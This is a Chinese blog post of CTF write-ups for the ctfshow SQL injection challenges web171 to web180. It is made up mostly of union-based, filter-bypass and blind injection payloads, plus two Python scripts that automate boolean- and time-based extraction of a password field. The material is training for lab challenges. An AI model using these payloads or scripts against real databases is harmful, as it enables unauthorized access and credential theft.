

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
  <link rel="icon" href="/img/biaotou.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="orange">
  <meta name="keywords" content="">
  
    <meta name="description" content="前言：sql算是最不熟悉的了，写的稍微详细一点吧,目前的ctf赛题是不会出一把梭的题目，实战环境sqlmap可以多用用，题目尽量还是手写。 web17111&#x27; or 1&#x3D;1--+  123根据id &#x3D; &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;传入的内容拼接就相当于id&#x3D;&#x27;1&#x27; or">
<meta property="og:type" content="article">
<meta property="og:title" content="ctf-sql注入">
<meta property="og:url" content="https://0ran9ewww.github.io/2024/09/23/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-sql%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="0raN9e的笔记">
<meta property="og:description" content="前言：sql算是最不熟悉的了，写的稍微详细一点吧,目前的ctf赛题是不会出一把梭的题目，实战环境sqlmap可以多用用，题目尽量还是手写。 web17111&#x27; or 1&#x3D;1--+  123根据id &#x3D; &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;传入的内容拼接就相当于id&#x3D;&#x27;1&#x27; or">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-22195210.png">
<meta property="article:published_time" content="2024-09-23T14:00:00.000Z">
<meta property="article:modified_time" content="2024-09-24T14:17:36.710Z">
<meta property="article:author" content="orange">
<meta property="article:tag" content="sql注入">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://0ran9ewww.github.io/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-22195210.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>ctf-sql注入 - 0raN9e的笔记</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"0ran9ewww.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"y20YQnBmfM0DqawGjwxeWhCq-gzGzoHsz","app_key":"Y55Ca02EpnhoEzDEjf7sqVwX","server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.1.1"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>0raN9e的blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/background.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="ctf-sql注入"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-09-23 22:00" pubdate>
          2024年9月23日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          9k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          76 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">ctf-sql注入</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    本文最后更新于 2024年9月24日 晚上
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>前言：sql算是最不熟悉的了，写的稍微详细一点吧,目前的ctf赛题是不会出一把梭的题目，实战环境sqlmap可以多用用，题目尽量还是手写。</p>
<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27; or 1=1--+</span><br></code></pre></td></tr></table></figure>

<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">根据id = &#x27;&quot;.$<span class="hljs-emphasis">_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br><span class="hljs-emphasis">传入的内容拼接就相当于</span><br><span class="hljs-emphasis">id=&#x27;1&#x27; or 1=1--+&#x27;limit 1;</span><br></code></pre></td></tr></table></figure>

<p>进行了简单的sql绕过</p>
<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>本地加入了返回逻辑，详细可以自己查看</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,database()%23</span><br></code></pre></td></tr></table></figure>

<p>首先爆看看库名，发现了<code>ctfshow_web</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure>

<p>再对所有可能的表进行爆列</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_user2<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure>

<p>再进行爆列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(password) from ctfshow_user2%23</span><br></code></pre></td></tr></table></figure>

<p>最后直接定位到password进行了</p>
<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>先用上题的最后payload查看看看，发现not_here,看一下本题的返回逻辑</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure>

<p>发现有个<code>ctfshow_user3</code>，直接写最后的payload，本题有匹配flag的过滤</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(password) from ctfshow_user3%23</span><br></code></pre></td></tr></table></figure>

<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>在前面的基础上过滤了<code>0-9</code></p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>利用replace就行替换</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;A&#x27;</span>),<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;B&#x27;</span>),<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;C&#x27;</span>),<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;D&#x27;</span>),<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;E&#x27;</span>),<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;F&#x27;</span>),<span class="hljs-number">7</span>,<span class="hljs-string">&#x27;G&#x27;</span>),<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;H&#x27;</span>),<span class="hljs-number">9</span>,<span class="hljs-string">&#x27;I&#x27;</span>),<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;J&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>讲数字用字母进行替换</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,&#x27;</span>A<span class="hljs-string">&#x27;),2,&#x27;</span>B<span class="hljs-string">&#x27;),3,&#x27;</span>C<span class="hljs-string">&#x27;),4,&#x27;</span>D<span class="hljs-string">&#x27;),5,&#x27;</span>E<span class="hljs-string">&#x27;),6,&#x27;</span>F<span class="hljs-string">&#x27;),7,&#x27;</span>G<span class="hljs-string">&#x27;),8,&#x27;</span>H<span class="hljs-string">&#x27;),9,&#x27;</span>I<span class="hljs-string">&#x27;),0,&#x27;</span>J<span class="hljs-string">&#x27;),&#x27;</span>b<span class="hljs-string">&#x27; from ctfshow_user4 where username=&#x27;</span>flag<span class="hljs-string">&#x27; %23</span><br></code></pre></td></tr></table></figure>

<p>得到的flag需要进行替换</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>利用盲注得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 构造 Payload</span><br>payload = <span class="hljs-string">&quot;1&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;cluster&#x27;,&#x27;boom&#x27;) %23&quot;</span><br>url = <span class="hljs-string">&quot;http://17641de3-ec90-4f5e-a197-d6bcfc72684d.challenge.ctf.show/api/v4.php?id=&quot;</span><br><br><span class="hljs-comment"># 测试字符是否大于给定的 ASCII 值</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_chr</span>(<span class="hljs-params">index: <span class="hljs-built_in">int</span>, offset: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url + payload.<span class="hljs-built_in">format</span>(index, offset), timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-comment"># 检查返回内容是否包含关键字</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;cluster&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;boom&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] Unexpected response for index <span class="hljs-subst">&#123;index&#125;</span>, offset <span class="hljs-subst">&#123;offset&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] Request failed: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 开始盲注过程</span><br>index = <span class="hljs-number">1</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br>max_length = <span class="hljs-number">50</span>  <span class="hljs-comment"># 假设flag最大长度</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(flag) &lt; max_length:<br>    start = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span>  <span class="hljs-comment"># ASCII 可打印字符范围</span><br>    <span class="hljs-keyword">while</span> start &lt; end:<br>        point = (start + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> test_chr(index, point):<br>            start = point + <span class="hljs-number">1</span>  <span class="hljs-comment"># 搜索更大的 ASCII 范围</span><br>        <span class="hljs-keyword">else</span>:<br>            end = point  <span class="hljs-comment"># 搜索更小的 ASCII 范围</span><br>    <span class="hljs-keyword">if</span> start == <span class="hljs-number">32</span>:  <span class="hljs-comment"># 当 start 等于 32 时，意味着没有更多字符</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Finished, flag is: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br>    flag += <span class="hljs-built_in">chr</span>(start)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] Current flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    index += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Final flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure>

<p>需要先找到接口，输入，最后跑一下脚本</p>
<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>)))<br></code></pre></td></tr></table></figure>

<p>匹配 ASCII 码表范围内的字符也就是说 字母 数字 符号都显示不出来了，猜测是时间盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and sleep(3)%23</span><br></code></pre></td></tr></table></figure>

<p>可以正常运行，写个脚本跑看看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://89f1ac82-1428-42c3-9b7a-0c3e5bbdc93c.challenge.ctf.show/api/v5.php?id=&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        payload = <span class="hljs-string">f&quot;1&#x27; and if(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(3),0) %23&quot;</span><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            res = requests.get(url+payload)<br>            stop_time = time.time()<br>            <span class="hljs-keyword">if</span> stop_time - start_time &gt;= <span class="hljs-number">3</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无法继续推测字符，可能到达结尾或出错。&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>觉得时间长的话可以微调一下时间间隔，不要过短</p>
<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>直接爆出来了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or  1=1%23</span><br></code></pre></td></tr></table></figure>

<h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>可以bp来fuzz一下，union，select这些被过滤了，这题可以用大小写过滤</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; Union Select 1,2,database()%23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; Union Select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; Union Select 1,2,password from ctfshow_user%23</span><br></code></pre></td></tr></table></figure>

<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>可以fuzz一下,这里比较懒我直接看wp了，这里过滤了空格，在sql里可以用<code>/**/</code>来代替空格</p>
<h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/or/**/1=1%23</span><br></code></pre></td></tr></table></figure>

<h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>常规做法的最后一步</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username=&#x27;</span>flag<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure>

<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>本题还是过滤了空格，但上题的做法也被过滤了，<code>+</code>也被过滤了，这里可以联想到命令执行的一些空格绕过</p>
<h3 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%09or%091=1%23</span><br></code></pre></td></tr></table></figure>

<h3 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h3><p>也是常规做法的最后一步</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username=&#x27;</span>flag<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure>

<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p>同样是空格过滤</p>
<h3 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cor%0c1=1%23</span><br></code></pre></td></tr></table></figure>

<h3 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;</span>flag<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure>

<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union(select(select(group_concat(password))from(ctfshow_user)),1,2)%23</span><br></code></pre></td></tr></table></figure>

<h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>同样是空格过滤，尝试了一下179的payload发现都不能成功，欸？最后过滤的要换一下的原因</p>
<h3 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cor%0c1=1--%0c</span><br></code></pre></td></tr></table></figure>

<h3 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;</span>flag<span class="hljs-string">&#x27;--%0c</span><br></code></pre></td></tr></table></figure>

<h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union(select(select(group_concat(password))from(ctfshow_user)),1,2)--%0c</span><br></code></pre></td></tr></table></figure>

<h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><p>给了过滤</p>
